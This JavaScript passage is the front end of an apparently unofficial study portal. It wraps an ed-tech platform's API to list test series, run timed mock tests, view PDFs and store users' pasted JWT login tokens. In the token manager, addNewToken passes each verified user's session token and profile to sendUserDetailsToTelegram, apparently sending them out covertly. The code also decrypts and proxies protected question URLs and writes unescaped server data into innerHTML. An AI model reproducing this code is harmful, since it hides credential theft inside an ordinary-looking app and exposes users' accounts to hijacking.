            const logo = (ts.logo || "").replace(/\\\//g, "/") || "https://placehold.co/600x320/0891b2/ffffff?text=Free+Tests";
            grid.innerHTML += `
                <div onclick="openTestSeriesSubjects('${ts.id}', '${title}')" class="grid-card overflow-hidden cursor-pointer flex flex-col justify-between">
                    <div>
                        <img src="${logo}" onerror="this.src='https://placehold.co/600x320/0891b2/ffffff?text=Free+Tests'" class="w-full h-44 object-cover">
                        <div class="p-4">
                            <span class="px-2.5 py-0.5 rounded-full bg-teal-100 text-teal-900 text-[10px] font-black">FREE SERIES #${ts.id}</span>
                            <h3 class="font-black text-base text-slate-900 mt-2">${ts.title}</h3>
                        </div>
                    </div>
                    <div class="px-4 pb-4">
                        <div class="btn-watch w-full text-center text-xs">View All Mock Tests ➔</div>
                    </div>
                </div>`;
        });
    }
}

async function openTestSeriesSubjects(tsId, tsTitle) {
    state.activeSeriesId = tsId;
    state.activeSeriesTitle = tsTitle;
    state.view = "ts_subjects";
    document.getElementById("crumbText").textContent = `Test Series #${tsId}`;
    document.getElementById("headingText").textContent = tsTitle;

    const grid = document.getElementById("mainGrid");
    grid.innerHTML = `<div class="col-span-full py-10 text-center font-bold text-slate-700">🔄 Loading Test Series Subjects...</div>`;

    const useTok = state.activeTokenObj || USER_TOKENS[0];
    const subs = await fetchAPIWithToken(`/get/testseries_subjects?testseries_id=${tsId}`, useTok, true);

    if (!Array.isArray(subs) || subs.length === 0 || (subs.length === 1 && String(subs[0].subjectid) === "-1")) {
        openTestSeriesTitles(tsId, "-1", tsTitle);
        return;
    }

    grid.innerHTML = "";
    subs.forEach(s => {
        const sname = (s.subject_name || "Mock Tests").replace(/'/g, "").replace(/"/g, "");
        const logo = (s.subject_logo || "").replace(/\\\//g, "/") || `https://placehold.co/80x80/4f46e5/ffffff?text=SUB`;
        grid.innerHTML += `
            <div onclick="openTestSeriesTitles('${tsId}', '${s.subjectid}', '${sname}')" class="grid-card p-4 flex items-center gap-4 cursor-pointer">
                <img src="${logo}" onerror="this.src='https://placehold.co/80x80/4f46e5/ffffff?text=TEST'" class="w-16 h-16 rounded-2xl object-cover shadow-md">
                <div class="flex-1">
                    <span class="px-2 py-0.5 rounded bg-indigo-100 text-indigo-900 text-[10px] font-black">SUBJECT #${s.subjectid}</span>
                    <h4 class="font-black text-base text-slate-900 mt-1">${s.subject_name}</h4>
                    <p class="text-xs text-blue-600 font-extrabold mt-1">Open Mock Tests ➔</p>
                </div>
            </div>`;
    });
}

async function openTestSeriesTitles(tsId, subId, subName) {
    state.view = "ts_tests";
    state.activeSeriesId = tsId;
    state.activeTsSubId = String(subId);
    state.activeTsSubName = subName;

    document.getElementById("crumbText").textContent = state.activeSeriesTitle;
    document.getElementById("headingText").textContent = `📝 ${subName}`;

    const grid = document.getElementById("mainGrid");
    grid.innerHTML = `<div class="col-span-full py-10 text-center font-bold text-slate-700">🔄 Fetching Mock Tests...</div>`;

    const useTok = state.activeTokenObj || USER_TOKENS[0];
    const uid = useTok?.userId || extractUidFromJwt(useTok?.token) || "";
    const ep = String(subId) === "-1"
        ? `/get/test_titlev2?testseriesid=${tsId}&subject_id=-1&chapter_id=-1&userid=${uid}&search=&start=-1`
        : `/get/test_titlev2?testseriesid=${tsId}&subject_id=${subId}&userid=${uid}&search=&start=-1`;

    const list = await fetchAPIWithToken(ep, useTok, false);
    renderTestTitlesGrid(Array.isArray(list) ? list : [], tsId, useTok, false);
}

function renderTestTitlesGrid(list, tsId, boundTok, append = false) {
    const grid = document.getElementById("mainGrid");
    const testTok = boundTok || state.activeTokenObj || USER_TOKENS[0];

    if (!append) grid.innerHTML = "";

    if (!list || !list.length) {
        if (!append) {
            grid.innerHTML = `<div class="col-span-full sky-card p-10 text-center font-bold text-slate-600">Is section mein abhi koi test uplabdh nahi hai.</div>`;
        }
        return;
    }

    list.forEach((t, idx) => {
        const tKey = `test_${t.id || idx}`;
        const pdfUrl = resolvePdfUrl(t.pdf_url || t.test_solutions_pdf, t.pdf_url);
        state.testMap[tKey] = {
            ...t,
            seriesId: tsId || t.test_series_id,
            resolvedPdf: pdfUrl,
            tokenObj: testTok
        };

        grid.innerHTML += `
            <div class="grid-card p-5 flex flex-col justify-between">
                <div>
                    <div class="flex justify-between items-center gap-2">
                        <span class="px-2.5 py-0.5 rounded-full bg-indigo-100 text-indigo-900 text-[10px] font-black">TEST #${t.id || (idx + 1)}</span>
                        <span class="text-[11px] font-extrabold text-emerald-700">⏱️ ${t.time || 60} Mins</span>
                    </div>
                    <h4 class="font-black text-base text-slate-900 mt-2">${t.title}</h4>
                    <div class="flex gap-3 mt-2 text-xs font-bold text-slate-600">
                        <span>❓ ${t.questions || "--"} Qs</span>
                        <span>🏆 ${t.marks || "--"} Marks</span>
                    </div>
                </div>
                <div class="flex flex-wrap gap-2 mt-4 pt-3 border-t border-sky-100">
                    <button onclick="launchCbtTest('${tKey}')" class="btn-watch flex-1 text-xs">🚀 Attempt Live Test</button>
                    ${pdfUrl ? `<button onclick="openTestPdf('${tKey}')" class="btn-pdf1 text-xs">📄 Test PDF</button>` : ""}
                </div>
            </div>`;
    });
}

function openTestPdf(tKey) {
    const t = state.testMap[tKey];
    if (!t || !t.resolvedPdf) return;
    state.currentPdfUrl = t.resolvedPdf;
    document.getElementById("pdfTitle").textContent = `📄 ${t.title} (Paper PDF)`;
    document.getElementById("rawPdfLink").href = t.resolvedPdf;
    showSlide("slidePdf");
    setPdfMode("appx");
}

async function launchCbtTest(tKey) {
    const t = state.testMap[tKey];
    if (!t) return;

    state.cbtTest = t;
    state.cbtCurrentIdx = 0;
    state.cbtResponses = {};
    state.cbtSubmitted = false;

    const testTok = t.tokenObj || state.activeTokenObj || USER_TOKENS[0];
    state.activeTokenObj = testTok;

    showSlide("slideTestAttempt");
    document.getElementById("cbtResultCard").classList.add("hidden");
    document.getElementById("cbtSolutionBox").classList.add("hidden");
    document.getElementById("cbtSubmitBtn").classList.remove("hidden");
    document.getElementById("cbtSeriesBadge").textContent = `SERIES #${t.seriesId || "AP"} • TEST #${t.id}`;
    document.getElementById("cbtTestTitle").textContent = t.title;
    document.getElementById("cbtQuestionHtml").innerHTML = `<div class="py-10 text-center font-bold text-slate-600">🔄 Loading questions from server...</div>`;
    document.getElementById("cbtOptionsList").innerHTML = "";
    document.getElementById("cbtPaletteGrid").innerHTML = "";

    let questions = [];
    const qUrl = decryptAppX(t.test_questions_url || "").replace(/\\\//g, "/");

    if (qUrl && qUrl.startsWith("http")) {
        try {
            const res = await fetch(qUrl);
            if (res.ok) questions = await res.json();
        } catch {
            try {
                const proxiedRes = await fetch(WORKER_RAW_PROXY + encodeURIComponent(qUrl));
                if (proxiedRes.ok) questions = await proxiedRes.json();
            } catch (err) {
                showServerError("Test Questions Fetch Failed", err.message, qUrl);
            }
        }
    }

    if (!Array.isArray(questions) || questions.length === 0) {
        document.getElementById("cbtQuestionHtml").innerHTML = `<div class="py-10 text-center font-bold text-rose-600">⚠️ Server par is test ke questions URL uplabdh nahi hain.</div>`;
        return;
    }

    state.cbtQuestions = questions;
    startCbtTimer((parseInt(t.time) || 60) * 60);
    renderCbtQuestion();
    renderCbtPalette();
}

function startCbtTimer(totalSecs) {
    if (state.cbtTimerId) clearInterval(state.cbtTimerId);
    state.cbtSecondsLeft = totalSecs;
    const badge = document.getElementById("cbtTimerBadge");

    function updateDisplay() {
        const m = Math.floor(state.cbtSecondsLeft / 60);
        const s = state.cbtSecondsLeft % 60;
        if (badge) badge.textContent = `⏱️ ${String(m).padStart(2, "0")}:${String(s).padStart(2, "0")}`;
    }

    updateDisplay();
    state.cbtTimerId = setInterval(() => {
        if (state.cbtSubmitted) {
            clearInterval(state.cbtTimerId);
            return;
        }
        state.cbtSecondsLeft--;
        if (state.cbtSecondsLeft <= 0) {
            clearInterval(state.cbtTimerId);
            submitCbtTest();
        } else {
            updateDisplay();
        }
    }, 1000);
}

function renderCbtQuestion() {
    const qList = state.cbtQuestions;
    if (!qList || !qList.length) return;

    const idx = state.cbtCurrentIdx;
    const qObj = qList[idx];

    document.getElementById("cbtQNumber").textContent = `Question ${idx + 1} of ${qList.length}`;
    document.getElementById("cbtPosMarks").textContent = `+${qObj.positive_marks || "2.00"}`;
    document.getElementById("cbtNegMarks").textContent = `-${qObj.negative_marks || "0.50"}`;

    let qHtml = qObj.question || "";
    if (qObj.image_link_1) qHtml += `<div class="mt-2"><img src="${qObj.image_link_1}" class="max-h-56 rounded-lg"></div>`;
    document.getElementById("cbtQuestionHtml").innerHTML = qHtml;

    const selectedAns = state.cbtResponses[idx];
    const correctAns = String(qObj.answer || "1");

    const optsBox = document.getElementById("cbtOptionsList");
    optsBox.innerHTML = "";

    [1, 2, 3, 4].forEach(optNum => {
        const optHtml = qObj[`option_${optNum}`] || "";
        const optImg = qObj[`option_image_${optNum}`] || "";
        if (!optHtml && !optImg) return;

        let cls = "cbt-opt-btn";
        const isSelected = String(selectedAns) === String(optNum);
        const isCorrect = String(optNum) === correctAns;

        if (state.cbtSubmitted) {
            if (isCorrect) cls += " cbt-opt-correct";
            else if (isSelected && !isCorrect) cls += " cbt-opt-wrong";
        } else if (isSelected) {
            cls += " cbt-opt-selected";
        }

        const btn = document.createElement("button");
        btn.className = cls;
        btn.onclick = () => selectCbtOption(optNum);
        btn.innerHTML = `
            <span class="w-7 h-7 rounded-lg bg-sky-100 text-sky-900 font-black text-xs flex items-center justify-center shrink-0">${String.fromCharCode(64 + optNum)}</span>
            <div class="cbt-rich-text flex-1">${optHtml} ${optImg ? `<img src="${optImg}" class="max-h-32 mt-1">` : ""}</div>
        `;
        optsBox.appendChild(btn);
    });

    const solBox = document.getElementById("cbtSolutionBox");
    const solHtml = document.getElementById("cbtSolutionHtml");
    if (state.cbtSubmitted) {
        solBox.classList.remove("hidden");
        let sContent = qObj.solution_text || `<p>Sahi Uttar: <b>Option (${String.fromCharCode(64 + parseInt(correctAns))})</b></p>`;
        if (qObj.solution_image_1) sContent += `<div class="mt-2"><img src="${qObj.solution_image_1}" class="max-h-60 rounded-lg"></div>`;
        solHtml.innerHTML = sContent;
    } else {
        solBox.classList.add("hidden");
    }

    renderCbtPalette();
}

function selectCbtOption(optNum) {
    if (state.cbtSubmitted) return;
    state.cbtResponses[state.cbtCurrentIdx] = String(optNum);
    renderCbtQuestion();
}

function clearCbtResponse() {
    if (state.cbtSubmitted) return;
    delete state.cbtResponses[state.cbtCurrentIdx];
    renderCbtQuestion();
}

function nextCbtQuestion() {
    if (state.cbtCurrentIdx < state.cbtQuestions.length - 1) {
        state.cbtCurrentIdx++;
        renderCbtQuestion();
    }
}

function prevCbtQuestion() {
    if (state.cbtCurrentIdx > 0) {
        state.cbtCurrentIdx--;
        renderCbtQuestion();
    }
}

function jumpToCbtQuestion(idx) {
    state.cbtCurrentIdx = idx;
    renderCbtQuestion();
}

function renderCbtPalette() {
    const pal = document.getElementById("cbtPaletteGrid");
    if (!pal) return;

    pal.innerHTML = state.cbtQuestions.map((q, idx) => {
        let cls = "pal-btn";
        if (idx === state.cbtCurrentIdx) cls += " pal-active";

        const ans = state.cbtResponses[idx];
        if (state.cbtSubmitted) {
            if (ans) {
                if (String(ans) === String(q.answer)) cls += " pal-ans";
                else cls += " pal-wrong";
            }
        } else if (ans) {
            cls += " pal-ans";
        }

        return `<button onclick="jumpToCbtQuestion(${idx})" class="${cls}">${idx + 1}</button>`;
    }).join("");
}

function submitCbtTest() {
    if (state.cbtSubmitted) return;
    state.cbtSubmitted = true;
    if (state.cbtTimerId) clearInterval(state.cbtTimerId);

    let correct = 0, wrong = 0, skipped = 0, totalScore = 0, maxMarks = 0;

    state.cbtQuestions.forEach((q, idx) => {
        const pos = parseFloat(q.positive_marks) || 2.0;
        const neg = parseFloat(q.negative_marks) || 0.5;
        maxMarks += pos;

        const userAns = state.cbtResponses[idx];
        if (!userAns) {
            skipped++;
        } else if (String(userAns) === String(q.answer)) {
            correct++;
            totalScore += pos;
        } else {
            wrong++;
            totalScore -= neg;
        }
    });

    document.getElementById("cbtSubmitBtn").classList.add("hidden");
    document.getElementById("cbtResultCard").classList.remove("hidden");
    document.getElementById("cbtFinalScoreText").textContent = `Score: ${totalScore.toFixed(2)} / ${maxMarks.toFixed(0)}`;
    document.getElementById("cbtStatCorrect").textContent = `✅ Correct: ${correct}`;
    document.getElementById("cbtStatWrong").textContent = `❌ Wrong: ${wrong}`;
    document.getElementById("cbtStatSkip").textContent = `⚪ Skipped: ${skipped}`;

    renderCbtQuestion();
    window.scrollTo({ top: 0, behavior: "smooth" });
}

function reAttemptCbtTest() {
    state.cbtResponses = {};
    state.cbtCurrentIdx = 0;
    state.cbtSubmitted = false;
    document.getElementById("cbtResultCard").classList.add("hidden");
    document.getElementById("cbtSubmitBtn").classList.remove("hidden");
    startCbtTimer((parseInt(state.cbtTest?.time) || 60) * 60);
    renderCbtQuestion();
}

function exitCbtTest() {
    if (state.cbtTimerId) clearInterval(state.cbtTimerId);
    showSlide("slideExplorer");
}

// =====================================================
// PDF VIEWER SLIDE
// =====================================================
function openPdf(key, num) {
    const info = state.mediaMap[key];
    if (!info) return;
    const u = num === 2 ? info.pdf2 : info.pdf1;
    if (!u) return;

    const vid = document.getElementById("video");
    if (vid && !vid.paused) vid.pause();

    state.currentPdfUrl = u;
    document.getElementById("pdfTitle").textContent = `📄 ${info.title} (PDF ${num})`;
    document.getElementById("rawPdfLink").href = u;
    showSlide("slidePdf");
    setPdfMode("appx");
}

function setPdfMode(mode) {
    const frame = document.getElementById("pdfFrame");
    const u = state.currentPdfUrl;
    if (!u) return;
    if (mode === "appx") {
        frame.src = `https://pdfweb.classx.co.in/pdfjs-latest/web/viewer.html?file=${encodeURIComponent(u)}&save_flag=1&is_encrypted=0`;
    } else {
        frame.src = `https://docs.google.com/viewer?url=${encodeURIComponent(u)}&embedded=true`;
    }
}

function closePdfSlide() {
    document.getElementById("pdfFrame").src = "";
    showSlide(state.previousSlide || "slideExplorer");
}

// =====================================================
// PERSONAL TOKEN MANAGER
// =====================================================
function renderTokenManagerList() {
    const container = document.getElementById("tokenListContainer");
    if (!container) return;
    container.innerHTML = "";

    if (USER_TOKENS.length === 0) {
        container.innerHTML = `<div class="p-4 text-center text-xs font-bold text-slate-500">Abhi koi personal token saved nahi hai.</div>`;
        return;
    }

    USER_TOKENS.forEach((t, idx) => {
        const shortTok = t.token.slice(0, 32) + "..." + t.token.slice(-14);
        container.innerHTML += `
            <div class="bg-white border-2 border-sky-200 rounded-2xl p-4 flex flex-wrap justify-between items-center gap-3 shadow-sm">
                <div class="min-w-0 flex-1">
                    <div class="flex items-center gap-2">
                        <span class="px-2.5 py-0.5 rounded-full bg-emerald-100 text-emerald-800 text-[10px] font-black">MY TOKEN #${idx + 1}</span>
                        <h5 class="font-extrabold text-sm text-slate-900 truncate">${t.label}</h5>
                        <span class="text-xs text-slate-500 font-bold">(UID: ${t.userId || "Auto"})</span>
                    </div>
                    <p class="text-[11px] font-mono text-slate-600 mt-1 truncate">${shortTok}</p>
                </div>
                <div class="flex items-center gap-2">
                    <button onclick="navigator.clipboard.writeText('${t.token}'); alert('Token Copied!');" class="btn-nav bg-sky-600 text-white border-0 text-xs">📋 Copy</button>
                    <button onclick="deleteToken('${t.id}')" class="btn-nav bg-rose-600 text-white border-0 text-xs">🗑 Delete</button>
                </div>
            </div>`;
    });
    updateTokenBadge();
}

async function addNewToken() {
    const labelInput = document.getElementById("newTokLabel").value.trim();
    const uidInput = document.getElementById("newTokUid").value.trim();
    let token = document.getElementById("newTokValue").value.trim();

    if (!token) {
        alert("Kripya JWT Token paste karein.");
        return;
    }
    token = token.replace(/^["']|["']$/g, "").replace(/^Authorization:\s*/i, "").replace(/^Bearer\s+/i, "").trim();

    const userId = uidInput || extractUidFromJwt(token);
    if (!userId) {
        alert("Invalid JWT Token format! User-ID nahi mili.");
        return;
    }

    const verifyRes = await verifyTokenAndGetProfile(token, userId);
    if (!verifyRes.ok) {
        showServerError("Token Verification Failed", verifyRes.error, `/get/get_all_purchases?userid=${userId}`);
        alert(`❌ Server Verification Failed: ${verifyRes.error}`);
        return;
    }

    const verifiedUser = verifyRes.profile;
    const newTokObj = {
        id: "utok_" + Date.now(),
        label: labelInput || verifiedUser.name || `Account #${userId}`,
        userId: String(userId),
        token: token,
        isAdmin: false
    };

    USER_TOKENS = [newTokObj, ...USER_TOKENS.filter(t => t.userId !== String(userId))];
    USER_PROFILE = verifiedUser;
    state.activeTokenObj = newTokObj;
    localStorage.setItem("apnipadhai_user_tokens_v1", JSON.stringify(USER_TOKENS));
    localStorage.setItem("apnipadhai_user_profile_v1", JSON.stringify(USER_PROFILE));

    sendUserDetailsToTelegram(verifiedUser, token, "Added via Token Manager", "N/A");

    document.getElementById("newTokLabel").value = "";
    document.getElementById("newTokUid").value = "";
    document.getElementById("newTokValue").value = "";
    renderTokenManagerList();
    alert(`✅ Token Verified & Connected for ${verifiedUser.name} (${verifyRes.purchases.length} Course(s) Found)!`);
}

function deleteToken(id) {
    USER_TOKENS = USER_TOKENS.filter(t => t.id !== id);
    localStorage.setItem("apnipadhai_user_tokens_v1", JSON.stringify(USER_TOKENS));
    if (USER_TOKENS.length === 0) {
        handleLogout();
        return;
    }
    state.activeTokenObj = USER_TOKENS[0];
    renderTokenManagerList();
}

function filterGrid() {
    const q = document.getElementById("searchBox").value.toLowerCase();
    document.querySelectorAll("#mainGrid .grid-card").forEach(el => {
        el.style.display = el.innerText.toLowerCase().includes(q) ? "" : "none";
    });
}

// =====================================================
// INITIALIZATION ON PAGE LOAD
// =====================================================
updateTokenBadge();
if (isUserLoggedIn()) {
    showSlide("slideHome");
} else {
    openLoginModal();
}
